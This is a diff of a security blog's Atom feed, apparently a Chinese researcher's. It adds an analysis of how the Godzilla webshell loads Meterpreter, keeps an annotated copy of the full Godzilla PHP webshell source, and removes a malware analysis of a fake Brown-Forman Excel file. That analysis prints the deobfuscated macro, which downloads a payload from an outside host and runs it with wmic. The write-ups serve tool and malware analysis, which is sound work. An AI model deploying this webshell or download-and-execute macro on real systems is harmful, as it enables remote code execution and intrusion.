@@ -6,7 +6,7 @@
   <link href="http://422926799.github.io/atom.xml" rel="self"/>
   
   <link href="http://422926799.github.io/"/>
-  <updated>2021-09-03T19:05:46.542Z</updated>
+  <updated>2021-09-03T19:15:13.441Z</updated>
   <id>http://422926799.github.io/</id>
   
   <author>
@@ -17,11 +17,34 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>哥斯拉实现meterpreter分析</title>
+    <link href="http://422926799.github.io/posts/19caa6fb.html"/>
+    <id>http://422926799.github.io/posts/19caa6fb.html</id>
+    <published>2021-09-03T19:08:51.000Z</published>
+    <updated>2021-09-03T19:15:13.441Z</updated>
+    
+    <content type="html"><![CDATA[<p>哥斯拉version:1.0<br>Cryption:PHP_XOR_BASE64<br>这里分析的php首先定位到shells/plugins/php/assets/Meterpreter.class</p><pre><code>* 先获取对于payload类型，然后从对应payload目录下读取反弹meterpreter的payload文件 （对应路径：plugins/&lt;scriptname&gt;/assets）* 调用对应payload里的include函数* include函数调用evalFunc，发送POST请求调用大马里的includeCode函数</code></pre><p><img src="https://z3.ax1x.com/2021/09/04/hccpa8.png" alt=""></p><p>调用对应payload里的include函数<br><img src="https://z3.ax1x.com/2021/09/04/hcc9IS.png" alt=""></p><p>通过get函数获取到$parameter数组里对应的binCode和codeName的value，最后写在session里（将反弹meterprter的payload拼接写到存大马的session文件里）<br><img src="https://z3.ax1x.com/2021/09/04/hccPPg.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/04/hcckxs.png" alt=""><br><img src="https://z3.ax1x.com/2021/09/04/hccEMn.png" alt=""></p><p>抓包如下<br><img src="https://z3.ax1x.com/2021/09/04/hccVrq.png" alt=""></p><p>之后点击Go Button后触发GoButtonClick事件</p><pre><code>* 发送POST请求调用大马里对应的run函数</code></pre><p><img src="https://z3.ax1x.com/2021/09/04/hccZq0.png" alt=""></p><p>Run函数</p><pre><code>* 获取传送过来的数据做好好下步划分的准备* 判断是否要进行bypass_open_basedir* 调用evalFunc函数执行反弹meterprter的code</code></pre><p><img src="https://z3.ax1x.com/2021/09/04/hccmZV.png" alt=""></p><p>就是<code>eval($_SESSION[&quot;Meterpreter&quot;])</code><br><img src="https://z3.ax1x.com/2021/09/04/hccuIU.png" alt=""></p><p>抓包如下<br>第二个PHPSESSIONID对应<code>$_SESSION[&quot;meterpter&quot;]</code><br><img src="https://z3.ax1x.com/2021/09/04/hccMiF.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/09/04/hccQG4.png" alt=""></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;哥斯拉version:1.0&lt;br&gt;Cryption:PHP_XOR_BASE64&lt;br&gt;这里分析的php首先定位到shells/plugins/php/assets/Meterpreter.class&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;* 先获取对于payload类型，然后从</summary>
+      
+    
+    
+    
+    
+    <category term="工具刨析" scheme="http://422926799.github.io/tags/工具刨析/"/>
+    
+  </entry>
+  
+  <entry>
     <title>哥斯拉整体过程刨析</title>
     <link href="http://422926799.github.io/posts/befc239e.html"/>
     <id>http://422926799.github.io/posts/befc239e.html</id>
     <published>2021-09-03T13:27:25.000Z</published>
-    <updated>2021-09-03T19:05:46.542Z</updated>
+    <updated>2021-09-03T19:05:54.125Z</updated>
     
     <content type="html"><![CDATA[<p>本文主要是分析哥斯拉流量协议实现的过程</p><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>版本:v1.0<br>有效荷载:Phpdynxxxxx<br>加密器:php_xor_base64</p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><pre><code class="php">&lt;?php    session_start();    @set_time_limit(0);    @error_reporting(0);    function E($D,$K){ //$D是base64解密后的数据,$K是key        for($i=0;$i&lt;strlen($D);$i++) {            $D[$i] = $D[$i]^$K[$i+1&amp;15]; //XOR解密数据        }        return $D;    }    function Q($D){        return base64_encode($D);    }    function O($D){        return base64_decode($D);    }    $P=&#39;pass&#39;;    $V=&#39;payload&#39;;    $T=&#39;3c6e0b8a9c15224a&#39;; //KEY    if (isset($_POST[$P])){ //检测密码字段是否存在POST请求        $F=O(E(O($_POST[$P]),$T)); //先base64解密数据，XOR运算解密数据，base64在解密xor解密后的数据        if (isset($_SESSION[$V])){ //检测SESSION是否存在 (对应SESSION 临时文件存放的shell)            $L=$_SESSION[$V]; //SESSION数据读取            $A=explode(&#39;|&#39;,$L); //分割|            class C{public function nvoke($p) {eval($p.&quot;&quot;);}} //执行命令            $R=new C();            $R-&gt;nvoke($A[0]); //调用nvoke函数            echo substr(md5($P.$T),0,16); //md5加密$p和$T，截断0到16位 （输出两次-&gt;开头&lt;data&gt;结尾）方便client提取返回内容            echo Q(E(@run($F),$T)); //输出结果            echo substr(md5($P.$T),16);        }else{            $_SESSION[$V]=$F;        }    }</code></pre><p>整体步骤如下：<br>1.一开始是没有session的，第一次把传过来的数据（大马）解密（base64_Decode-&gt;Xor_Decode-&gt;Base64_decode）写入到session，产生临时文件<br>    -&gt; Server返回带有session编号的cookie返回给client （ Example:Set-Cookie: PHPSESSID=064ef1kh9kjhmp9k46rvejh396; path=/）<br>    -&gt; Client接到带有PHPSESSID后，后续的请求都带上PHPSESSID<br>2.往后调用对应的功能pass字段就会调用对应大马里的函数</p><p>session产生的临时文件里的大马 （对应的脚本语言对应jar目录下的shells/payloads/<scriptname>/assets/）<br><img src="https://z3.ax1x.com/2021/09/03/hcEbUs.png" alt=""></scriptname></p><p>jeb反编译Godzilla.jar<br>定位到core/ui/component/dialog/ShellSetting.Class<br>在配置shell的时候步骤如下<br><img src="https://z3.ax1x.com/2021/09/03/hcEX80.png" alt=""></p><p>调用updateTempShellEntity更新模板对应的设置<br><img src="https://z3.ax1x.com/2021/09/03/hcVSrF.png" alt=""></p><p>initShellOpertion函数<br>(PayloadModel-&gt;对应你设置时选择的有效荷载，CryptModel-&gt;对应你设置时选择的加密器)</p><pre><code>* 返回http对象* 返回对应的payloadModel class对象* 返回对应的cryptModel class对象* 调用CryptModel.init函数* 调用payloadModel.init函数* 调用payloadModel.test函数</code></pre><p><img src="https://z3.ax1x.com/2021/09/04/hc6oVK.png" alt=""></p><p>getPayload函数<br><img src="https://z3.ax1x.com/2021/09/04/hc6bPe.png" alt=""></p><p>getCryption函数</p><p>这里加密器用的PhpXor对应shells/cryptions/phpXor/PhpXor.class<br>init函数</p><pre><code>* 返回http对象* 返回配置shell设置的密钥* 返回配置shell设置的密码* md5加密pass+key* 截断取0-16</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/09/7cb53e08b7bb685b.png" alt=""></p><p>check返回对应的状态<br><img src="https://i.bmp.ovh/imgs/2021/09/45892a92032b58d9.png" alt=""></p><p>这里分析的payloadModel对应shells/payloads/php/PhpShell.class</p><pre><code>* 返回http对象* 返回对应的shell编码</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/09/f99a65c395d7cd8e.png" alt=""></p><p>test函数<br>（发送test关键字-&gt;加密后，判断返回数据结果解密后是否存在ok，如果是则代表成功）<br><img src="https://i.bmp.ovh/imgs/2021/09/0af41e6126380b52.png" alt=""></p><p>evalFunc函数<br>获取对应的class name添加到 ReqParameter类型中，调用format返回base64编码后的结果，并开始拼接POST传输的参数，最后调用sendHttpResponse函数发送请求<br><img src="https://i.bmp.ovh/imgs/2021/09/77b11af83b4f41e1.png" alt=""></p><p>format函数<br><img src="https://i.bmp.ovh/imgs/2021/09/32314f9b3751fef5.png" alt=""></p><p>sendHttpResponse函数经过几重包装</p><pre><code>* 将上面base64编码的结果进行最终加密* 最后POST发送pass字段</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/09/98468b20d2285e45.png" alt=""></p><p>encode函数对应PHP_XOR_BASE64里的</p><pre><code>* 根据配置的密钥进行xor编码* 最后base64，拼接到pass字段</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/09/03ab31c2007cd287.png" alt=""></p><p>burp捕获配置时的三个包：<br>第一个发送大马数据，返回session ID<br><img src="https://i.bmp.ovh/imgs/2021/09/2507ef51b7a27ea5.png" alt=""></p><p>第二和第三个都是对应payload的test函数<br><img src="https://i.bmp.ovh/imgs/2021/09/706a3bd4df8d6d59.png" alt=""></p><p>完成这些步骤之后，调用对应的功能就是调用大马里对应的函数<br>参考链接:<a href="https://www.freebuf.com/sectool/285693.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/285693.html</a></p>]]></content>
     
@@ -435,28 +458,6 @@ map to guest = Bad </summary>
       
       
     <summary type="html">&lt;h2 id=&quot;分析过程&quot;&gt;&lt;a href=&quot;#分析过程&quot; class=&quot;headerlink&quot; title=&quot;分析过程&quot;&gt;&lt;/a&gt;分析过程&lt;/h2&gt;&lt;p&gt;cs克隆&lt;br&gt;&lt;img src=&quot;https://z3.ax1x.com/2021/06/10/2RieSA.png&quot; a</summary>
-      
-    
-    
-    
-    
-    <category term="恶意分析" scheme="http://422926799.github.io/tags/恶意分析/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>仿造Brown-Forman恶意文档分析</title>
-    <link href="http://422926799.github.io/posts/5245e2ed.html"/>
-    <id>http://422926799.github.io/posts/5245e2ed.html</id>
-    <published>2021-06-08T17:47:43.000Z</published>
-    <updated>2021-06-08T18:00:24.180Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>信息来源：<a href="https://nitter.domain.glass/Arkbird_SOLG/status/1400845444889120783#m" target="_blank" rel="noopener">https://nitter.domain.glass/Arkbird_SOLG/status/1400845444889120783#m</a><br><img src="https://z3.ax1x.com/2021/06/09/2so9S0.png" alt=""></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>VT查杀：<a href="https://www.virustotal.com/gui/file/b8226e0691779280f1cbbcba93d41e01bc26a7ad37c88bc3b835e72c1376a7fe/detection" target="_blank" rel="noopener">https://www.virustotal.com/gui/file/b8226e0691779280f1cbbcba93d41e01bc26a7ad37c88bc3b835e72c1376a7fe/detection</a></p><pre><code>MD5    4fb331e4e5c6094e731690371687b110SHA-1    bcecaaba6462550c61f7ed572e2c06ef8f3f378aSHA-256    b8226e0691779280f1cbbcba93d41e01bc26a7ad37c88bc3b835e72c1376a7feVhash    ec726ed39dd1773fb0790767871cde5cSSDEEP    12288:HMc+2YnB6YTbkvA00E+XvQNBzcytqew5W99QPR69Ke+SajzvEnj/igo7tbhzdSNN:H8sYvkhRzdoW9yRCh+vwnj/it7vBSjTLSH    T148F423A542CEFD48EA3A3D3761C5039DA197ACEB93150F420E73DB22D99A6F32511F18</code></pre><p><img src="https://z3.ax1x.com/2021/06/09/2so30e.png" alt=""></p><p>执行流程<br><img src="https://z3.ax1x.com/2021/06/09/2so8TH.png" alt=""></p><p>下载下来，打开是典型的隐藏表执行宏<br><img src="https://z3.ax1x.com/2021/06/09/2soJkd.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/09/2soYtA.png" alt=""></p><p>逐个提取出里面的vba，得到的结果是这样的<br><img src="https://z3.ax1x.com/2021/06/09/2sod6f.png" alt=""></p><pre><code>Auto_Open=AB16() ;=FORMULA.ARRAY(&#39;reierj ntrutruiret eruireur&#39;!AJ17&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ18&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ19&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ20&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ21&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ22&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ23&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ24,AB17)=Z16() ;Z16=CALL(AB17,AC17,&quot;JCJ&quot;,AD16,0) //Kernel32,,JCJ,C:/Users/Public,0=CALL(&quot;UR&quot;&amp;&#39;reierj ntrutruiret eruireur&#39;!AM18,&#39;reierj ntrutruiret eruireur&#39;!AN17&amp;&#39;reierj ntrutruiret eruireur&#39;!AN18&amp;&#39;reierj ntrutruiret eruireur&#39;!AN19&amp;&#39;reierj ntrutruiret eruireur&#39;!AN20&amp;&#39;reierj ntrutruiret eruireur&#39;!AN21&amp;&#39;reierj ntrutruiret eruireur&#39;!AN22&amp;&#39;reierj ntrutruiret eruireur&#39;!AN23&amp;&#39;reierj ntrutruiret eruireur&#39;!AN24&amp;&#39;reierj ntrutruiret eruireur&#39;!AN25&amp;&#39;reierj ntrutruiret eruireur&#39;!AN26&amp;&#39;reierj ntrutruiret eruireur&#39;!AN27&amp;&#39;reierj ntrutruiret eruireur&#39;!AN28&amp;&#39;reierj ntrutruiret eruireur&#39;!AN29&amp;&#39;reierj ntrutruiret eruireur&#39;!AN30&amp;&#39;reierj ntrutruiret eruireur&#39;!AN31&amp;&#39;reierj ntrutruiret eruireur&#39;!AN32&amp;&#39;reierj ntrutruiret eruireur&#39;!AN33&amp;&#39;reierj ntrutruiret eruireur&#39;!AD17,AH24,0,A96,&#39;reierj ntrutruiret eruireur&#39;!AD16&amp;&#39;reierj ntrutruiret eruireur&#39;!AE16,0,0) //URLMon URLDownloadToFileA JJCCBB,0,https://opposedent.com/css/main.css  C:/Users/Public//send.css=AE25()  ;EXEC(&quot;wmic process call create &#39;C:/Users/Public/send.css&#39;&quot;)//远程下载https://opposedent.com/css/main.css 保存在C:/Users/Public/send.css，wmic创建进程执行C:/Users/Public/send.css</code></pre><p><strong> main.css </strong><br>MD5    6f891127db5efdb86a63c7a60a96103f<br>SHA-1    590945c764eb6acccadba94c02d0bc710886f865<br>SHA-256    944e1871cecddd5c18a8939f246e5f552cb24f0b0179f4902c0559b2ad3d336b<br>Vhash    075066551d1d15155az5e!z<br>Authentihash    da7ab1728350ba9cf4a5f8dfa807d89002ad70db8c76829562500c0044776b37<br>Imphash    60f1da2d26406f6f3578f73785af8e9a<br>Rich PE header hash    004ccbc588d0cc025f006eb509f7f855<br>SSDEEP    12288:cGMMRFE7g6Ys/K7zyfuJTsQp4Cp6y5SrL1znr2LphlYuGUoPavYWIJdvrQoDpNkr:9zwRYs/K7ziuKU4jALFYuGDQ2vQoDkRN<br>TLSH    T10AF48D307A52C038F5FB21F85AA9DE34941DBAB0671C68CB63D55EE9D6385F89C3021B<br>PE查询结果<br><img src="https://z3.ax1x.com/2021/06/09/2soBnS.png" alt=""></p><p>VC写的，x86，开了ASLR<br><img src="https://z3.ax1x.com/2021/06/09/2soD0g.png" alt=""></p><p>整体流程是：</p><pre><code>1. 延时几秒2. 反调试检测3. 获取当前进程路径4. 读取自身，设置文件指针，文件数据读取5. 内存区域更改6. 加载执行</code></pre><p><img src="https://z3.ax1x.com/2021/06/09/2sor7Q.png" alt=""></p><p>反调试检测<br><img src="https://z3.ax1x.com/2021/06/09/2soykj.png" alt=""></p><p>加载对应的DLL和实例化对应的API<br><img src="https://z3.ax1x.com/2021/06/09/2so6ts.png" alt=""></p><p>读取自身<br><img src="https://z3.ax1x.com/2021/06/09/2sochn.png" alt=""></p><p>加载对应的DLL和API<br><img src="https://z3.ax1x.com/2021/06/09/2so2pq.png" alt=""></p><p>内存加载的PE<br><img src="https://z3.ax1x.com/2021/06/09/2soR10.png" alt=""></p><p>调试过一遍后，没看出什么危险的操作。利用沙箱运行得到以下结果<br><a href="https://s.threatbook.cn/report/file/944e1871cecddd5c18a8939f246e5f552cb24f0b0179f4902c0559b2ad3d336b/?env=win7_sp1_enx86_office2013" target="_blank" rel="noopener">https://s.threatbook.cn/report/file/944e1871cecddd5c18a8939f246e5f552cb24f0b0179f4902c0559b2ad3d336b/?env=win7_sp1_enx86_office2013</a><br><img src="https://z3.ax1x.com/2021/06/09/2soWcV.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/09/2sofXT.png" alt=""></p><h2 id="技术总结"><a href="#技术总结" class="headerlink" title="技术总结"></a>技术总结</h2><pre><code>1. Excel隐藏表执行宏2. 反调试，反沙箱3. 读取自身内存加载PE执行</code></pre><p>能力有限，勿喷</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h2&gt;&lt;p&gt;信息来源：&lt;a href=&quot;https://nitter.domain.glass/Arkbird_SOLG/status/14008454</summary>
       
     
     
